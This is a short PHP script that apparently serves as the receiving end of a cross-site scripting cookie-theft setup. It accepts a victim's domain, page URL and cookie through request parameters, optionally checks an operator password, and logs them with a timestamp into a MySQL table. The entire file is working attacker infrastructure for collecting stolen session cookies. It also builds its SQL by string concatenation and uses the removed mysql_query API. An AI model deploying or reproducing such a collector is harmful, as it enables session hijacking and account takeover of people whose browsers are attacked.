<?php
function filter($str){
	// 转义为HTML Entity。安全性还行吧？
	$str = trim(htmlspecialchars($str,ENT_QUOTES));
	$str = str_replace('\\','&#92;',$str);
	$str = str_replace('/','&#47;',$str);
	//$str = str_replace('#','&#35;',$str);
	return $str;
}

require_once('config.php');
require_once('db.php');
if($write_pwd!='' && $_REQUEST['pwd']!=$write_pwd)
{
  die('Who are you? Password requierd.');
}

if(isset($_REQUEST['domain']) &&
		isset($_REQUEST['url']) &&
		isset($_REQUEST['cookie']) &&
		trim($_REQUEST['domain']) != '' &&
		trim($_REQUEST['url']) != ''){
	$domain = filter($_REQUEST['domain']);
	$url = filter(urldecode($_REQUEST['url']));
	$cookie = filter($_REQUEST['cookie']);
	date_default_timezone_set('Asia/Shanghai');
	$time = date('Y-m-d H:i:s');
	
	$sql = 'insert into info (`time`,`domain`,`url`,`cookie`) values ("'.$time.'","'.$domain.'","'.$url.'","'.$cookie.'")';
	//echo($sql);
	$result=mysql_query($sql);
	/*if(!$result){
		echo mysql_error();
	}*/
	mysql_close($conn);
}
?>